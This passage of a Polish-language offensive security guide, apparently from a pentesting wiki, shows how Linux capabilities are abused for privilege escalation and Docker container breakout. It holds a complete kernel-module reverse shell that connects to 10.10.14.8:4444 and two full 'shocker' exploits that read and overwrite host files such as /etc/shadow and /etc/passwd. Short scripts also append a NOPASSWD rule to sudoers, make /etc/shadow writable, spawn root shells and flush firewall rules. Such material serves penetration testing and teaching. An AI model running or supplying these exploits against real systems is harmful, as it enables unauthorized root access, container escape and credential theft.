km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Przykład 2 z binary**

W poniższym przykładzie binary **`kmod`** ma to uprawnienie.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Oznacza to, że można użyć polecenia **`insmod`** do wstawienia modułu jądra. Postępuj zgodnie z poniższym przykładem, aby uzyskać **reverse shell**, wykorzystując to uprawnienie.

**Przykład ze środowiskiem (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Dockera za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku widać, że capability **SYS_MODULE** jest włączona.<sup>[[14]](#references)</sup>

**Utwórz** **kernel module**, który będzie wykonywał reverse shell, oraz **Makefile**, aby go **skompilować**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Pusty znak przed każdym słowem `make` w pliku Makefile **musi być tabulatorem, a nie spacjami**!

Wykonaj `make`, aby go skompilować.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Na koniec uruchom `nc` wewnątrz powłoki i **load the module** z innej powłoki, a przechwycisz powłokę w procesie nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod tej techniki został skopiowany z laboratorium „Abusing SYS_MODULE Capability” z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **ominięcie uprawnień wymaganych do odczytywania plików oraz odczytywania i wykonywania katalogów**. Jego głównym zastosowaniem jest wyszukiwanie lub odczytywanie plików. Umożliwia jednak również procesowi użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, w tym do plików znajdujących się poza przestrzenią nazw montowania procesu. Uchwyt używany przez `open_by_handle_at(2)` powinien być nieprzezroczystym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać poufne informacje, takie jak numery inode, które są podatne na manipulację. Możliwość wykorzystania tej capability, szczególnie w kontekście kontenerów Docker, została zademonstrowana przez Sebastiana Krahmera za pomocą exploitu shocker, co opisano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Oznacza to, że można ominąć kontrole uprawnień odczytu plików oraz kontrole uprawnień odczytu/wykonywania katalogów**.<sup>[[14]](#references)</sup>

**Przykład z użyciem pliku binarnego**

Plik binarny może odczytywać pliki dostępne w jego przestrzeniach nazw. Jeśli więc plik taki jak `tar` ma tę capability, może odczytać plik shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Przykład z binary2**

W tym przypadku załóżmy, że binary **`python`** ma tę capability. Aby wyświetlić pliki roota, możesz wykonać:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Aby odczytać plik, możesz wykonać:
```python
print(open("/etc/shadow", "r").read())
```
**Przykład w środowisku (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku widać, że capability **DAC_READ_SEARCH** jest włączona. Omija ona kontrole odczytu/wyszukiwania DAC i zezwala na użycie `open_by_handle_at(2)`; sama w sobie nie jest capability do debugowania procesów.<sup>[[14]](#references)</sup>

Informacje o działaniu poniższego exploita znajdziesz pod adresem [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ale w skrócie: **CAP_DAC_READ_SEARCH** umożliwia przeszukiwanie systemu plików bez sprawdzania uprawnień i zezwala na użycie `open_by_handle_at(2)`; może to ujawnić pliki otwarte przez inne procesy, gdy odpowiednie namespaces i mounty są dostępne.<sup>[[13]](#references)[[14]](#references)</sup>

Oryginalny exploit wykorzystujący te uprawnienia do odczytu plików z hosta znajduje się tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); poniżej znajduje się **zmodyfikowana wersja, która pozwala przekazać plik do odczytu jako pierwszy argument i zrzucić wynik do pliku**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa /etc/hostname. Jeśli exploit nie działa, być może musisz ustawić inny plik. Aby znaleźć plik zamontowany na hoście, po prostu wykonaj polecenie mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa...](<../../images/image (407) (1).png>)

**Kod tej techniki został skopiowany z laboratorium „Abusing DAC_READ_SEARCH Capability” ze strony** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Ta capability omija sprawdzanie uprawnień do odczytu, zapisu i wykonywania plików**.<sup>[[14]](#references)</sup>

Poszukaj plików, które stają się dostępne do odczytu lub zapisu dzięki członkostwu w uprzywilejowanej grupie; przydatne cele zależą od właściciela pliku i bitów trybu uprawnień.<sup>[[14]](#references)</sup>

**Przykład z binary**

W tym przykładzie vim ma tę capability, więc możesz modyfikować dowolny plik, taki jak _passwd_, _sudoers_ lub _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Przykład z plikiem binarnym 2**

W tym przykładzie plik binarny **`python`** będzie miał tę capability. Możesz użyć python do nadpisania dowolnego pliku:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Przykład ze środowiskiem + CAP_DAC_READ_SEARCH (Docker breakout)**

Potwierdź `CAP_DAC_OVERRIDE` za pomocą `capsh --print`, jak pokazano we wcześniejszym przykładzie środowiska `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Przede wszystkim przeczytaj poprzednią sekcję, która [**wykorzystuje capability DAC_READ_SEARCH do odczytu dowolnych plików**](linux-capabilities.md#cap_dac_read_search) hosta, i **skompiluj** exploit.\
Następnie **skompiluj poniższą wersję shocker exploit**, która umożliwi Ci **zapis dowolnych plików** w systemie plików hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Aby **uciec z kontenera Docker**, możesz **pobrać** z hosta pliki `/etc/shadow` i `/etc/passwd`, **dodać** do nich **nowego użytkownika**, a następnie użyć **`shocker_write`**, aby je nadpisać. Następnie uzyskaj **dostęp** przez **ssh**.

**Kod tej techniki został skopiowany z laboratorium „Abusing DAC_OVERRIDE Capability”** na stronie [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Ta capability pozwala procesowi zmieniać właściciela plików**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Załóżmy, że capability posiada plik binarny **`python`**; możesz zmienić właściciela pliku, takiego jak **`shadow`**, a następnie wykorzystać uzyskany dostęp do jego modyfikacji, jeśli pozostałe uprawnienia na to pozwalają:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Lub z plikiem binarnym **`ruby`** posiadającym tę capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Ta capability omija kontrole własności podczas wielu operacji na plikach, w tym podczas zmiany uprawnień**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli python ma tę capability, możesz zmodyfikować uprawnienia pliku shadow, **zmienić hasło roota** i eskalować uprawnienia:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Ta capability pozwala procesowi zmienić swój efektywny identyfikator użytkownika, z zastrzeżeniem reguł dotyczących poświadczeń i capability egzekwowanych przez kernel**.<sup>[[14]](#references)</sup>

**Przykład z binary**

Jeśli python ma tę **capability**, możesz bardzo łatwo ją wykorzystać do eskalacji uprawnień do root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Inny sposób:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Ta capability pozwala procesowi zmienić jego efektywny identyfikator grupy, z zastrzeżeniem reguł dotyczących poświadczeń i capabilities egzekwowanych przez kernel**.<sup>[[14]](#references)</sup>

Istnieje wiele plików, które można **nadpisać w celu eskalacji uprawnień,** [**pomysły możesz znaleźć tutaj**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z plikiem binarnym**

W tym przypadku należy szukać interesujących plików, które grupa może odczytywać, ponieważ można podszyć się pod dowolną grupę:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Po znalezieniu pliku, który możesz wykorzystać (poprzez odczyt lub zapis) do eskalacji uprawnień, możesz **uzyskać shell podszywający się pod interesującą grupę** za pomocą:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
W tym przypadku podszyto się pod grupę shadow, dzięki czemu można odczytać plik `/etc/shadow`:
```bash
cat /etc/shadow
```
### Połączony łańcuch: CAP_SETGID + CAP_CHOWN

Gdy obie capabilities są dostępne w tym samym helperze, praktyczny łańcuch wygląda następująco:

1. Zmień EGID na `shadow` (lub inną uprzywilejowaną grupę).
2. Użyj `chown` na `/etc/shadow`, aby ustawić swój UID, zachowując grupę `shadow`.
3. Odczytaj docelowy hash i wykonaj crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Pozwala to uniknąć konieczności posiadania bezpośrednio pełnych uprawnień root i często wystarcza do pivotowania przez ponowne użycie poświadczeń.

Jeśli zainstalowany jest **docker**, możesz **podszyć się pod** grupę **docker** i nadużyć jej w celu komunikacji z [**docker socket** i eskalacji uprawnień](#writable-docker-socket).

## CAP_SETFCAP

**To capability pozwala procesowi ustawiać capabilities plików**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli python ma to **capability**, możesz bardzo łatwo je nadużyć, aby eskalować uprawnienia do root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Nowo zapisany zestaw capabilities pliku zastępuje poprzedni zestaw; jeśli helper zostanie następnie wykonany wyłącznie z nowymi capabilities, może już nie zachować `CAP_SETFCAP` do aktualizacji innego pliku.<sup>[[14]](#references)[[25]](#references)</sup>

Po uzyskaniu [SETUID capability](linux-capabilities.md#cap_setuid) możesz przejść do tej sekcji, aby zobaczyć, jak eskalować uprawnienia.

**Przykład ze środowiskiem (Docker breakout)**

Udokumentowany domyślny zestaw capabilities Docker zawiera **CAP_SETFCAP**, ale rzeczywisty zestaw zależy od konfiguracji runtime.<sup>[[19]](#references)</sup>
Możesz sprawdzić capabilities procesu za pomocą:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ta capability umożliwia zapisywanie capabilities pliku, ale sama w sobie nie nadaje tych capabilities bieżącemu procesowi ani nie omija reguł dotyczących pliku, bounding-set i namespace stosowanych podczas wykonywania pliku.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Uprawnienia pliku są ograniczone przez zestaw ograniczeń uprawnień procesu, a bit effective pliku kontroluje, czy dozwolony zestaw pliku zostanie podniesiony do efektywnego zestawu procesu. Dlatego dodanie uprawnień do pliku nie sprawia automatycznie, że każde żądane uprawnienie będzie możliwe do użycia w czasie wykonywania.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) udostępnia szereg wrażliwych operacji, w tym dostęp do `/dev/mem`, `/dev/kmem` lub `/proc/kcore`, modyfikowanie `mmap_min_addr`, dostęp do wywołań systemowych `ioperm(2)` i `iopl(2)` oraz różne polecenia dyskowe. `FIBMAP ioctl(2)` jest również włączane za pomocą tego uprawnienia, co w [przeszłości](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) powodowało problemy. Zgodnie ze stroną man pozwala ono również posiadaczowi wykonywać szereg operacji specyficznych dla urządzeń na innych urządzeniach.<sup>[[14]](#references)</sup>

Może to być przydatne w **eskalacji uprawnień** i **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**To uprawnienie omija kontrole uprawnień podczas wysyłania sygnałów do procesów w przypadkach określonych przez kernel**.<sup>[[14]](#references)</sup>

**Example with binary**

Załóżmy, że binary **`python`** ma to uprawnienie. Jeśli udałoby Ci się **również zmodyfikować konfigurację jakiejś usługi lub socketu** (albo dowolny plik konfiguracyjny powiązany z usługą), możesz dodać do niej backdoor, a następnie zabić proces powiązany z tą usługą i zaczekać, aż nowy plik konfiguracyjny zostanie wykonany wraz z Twoim backdoorem.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Jeśli masz capabilities kill, a **node program działa jako root** (lub jako inny użytkownik), prawdopodobnie możesz **wysłać** mu **sygnał SIGUSR1** i sprawić, aby **otworzył debugger node**, z którym możesz się połączyć.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ta capability umożliwia nasłuchiwanie na portach internetowych poniżej 1024.** Nie zapewnia bezpośrednio szerszej eskalacji uprawnień.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli **`python`** ma tę capability, będzie mógł nasłuchiwać na dowolnym porcie, a nawet łączyć się z niego z dowolnym innym portem (niektóre usługi wymagają połączeń z portów o określonych uprawnieniach)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) pozwala procesom **tworzyć gniazda RAW i PACKET**, umożliwiając im generowanie i wysyłanie dowolnych pakietów sieciowych. Może to prowadzić do zagrożeń bezpieczeństwa w środowiskach kontenerowych, takich jak spoofing pakietów, wstrzykiwanie ruchu oraz omijanie kontroli dostępu do sieci. Atakujący mogą wykorzystać tę możliwość do zakłócania routingu kontenerów lub naruszenia bezpieczeństwa sieci hosta, zwłaszcza bez odpowiedniej ochrony firewall. Dodatkowo **CAP_NET_RAW** obsługuje operacje takie jak ping za pomocą żądań RAW ICMP.<sup>[[14]](#references)</sup>

**Może to umożliwiać przechwytywanie pakietów przy użyciu odpowiedniego interfejsu gniazda.** Nie zapewnia bezpośrednio szerszej eskalacji uprawnień.<sup>[[14]](#references)</sup>

**Przykład z użyciem pliku binarnego**

Jeśli plik binarny **`tcpdump`** ma tę capability, będzie można używać go do przechwytywania informacji o sieci.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Jeśli **środowisko** przyznaje tę capability, **`tcpdump`** może również użyć jej do sniffowania ruchu.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym 2**

Poniższy przykład zawiera kod **`python2`**, który może być przydatny do przechwytywania ruchu interfejsu "**lo**" (**localhost**). Kod pochodzi z laboratorium "_The Basics: CAP-NET_BIND + NET_RAW" na stronie [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) daje posiadaczowi możliwość **zmieniania konfiguracji sieci**, w tym ustawień firewalla, tablic routingu, uprawnień gniazd oraz ustawień interfejsów sieciowych w obrębie udostępnionych network namespaces. Umożliwia także włączanie **promiscuous mode** na interfejsach sieciowych, co pozwala na sniffing pakietów w różnych network namespaces.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Załóżmy, że **plik binarny python** ma te capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

